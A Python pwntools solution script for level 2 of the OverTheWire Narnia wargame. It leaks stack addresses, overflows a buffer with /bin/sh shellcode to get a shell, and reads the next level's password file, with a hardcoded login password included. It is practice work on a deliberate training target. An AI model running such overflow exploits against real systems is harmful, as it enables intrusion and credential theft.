#!/usr/bin/env python
#encoding:utf-8

import os
from pwn import *
from utils import *

level = 2
host = 'narnia.labs.overthewire.org'
user = 'narnia%d' % level
bin_file = 'narnia%d' % level
password = 'nairiepecu'
pass_file = '/etc/narnia_pass/narnia%d' % (level + 1)
bin_path = '/narnia/%s' % bin_file
source_path = '/narnia/%s.c' % bin_file

# context.log_level = 'debug'
shell = ssh(host=host, user=user, password=password)
# Download challenge related files if not exists.
if not os.path.exists(bin_file):
    shell.download_file(bin_path)
    shell.download_file(source_path)

shell.set_working_directory()
shell.upload_file('leak.cpp')
shell.run('g++ -m32 -o leak leak.cpp')
shell.upload_file('exec.py')

def run_binary(binary, s=''):
    cmd = 'python exec.py %r %s' % (binary, enhex(s))
    return shell.run(cmd)

# leak the address of argv1 and ebp in main function.
output = run_binary('./leak', NOPS(0xa0)).recvall().split('\n')
addr = int(output[0], 16)
ebp = int(output[1], 16)
log.success('Get argv[1] addr: %#x' % addr)
log.success('Get ebp: %#x' % ebp)

payload = asm(shellcraft.sh())
payload = RIGHT_PAD(payload, 128 + (ebp & 0xf) + 4)
payload += p32(addr)
# in order to keep the stack, pad the payload to 150
payload = RIGHT_PAD(payload, 0xa0)
io = run_binary(bin_path, payload)
io.clean()

io.sendline('id')
log.info('id: %s' % io.recv())
io.sendline('cat %s' % pass_file)
password = io.recv()
log.success('Password: %s' % password)
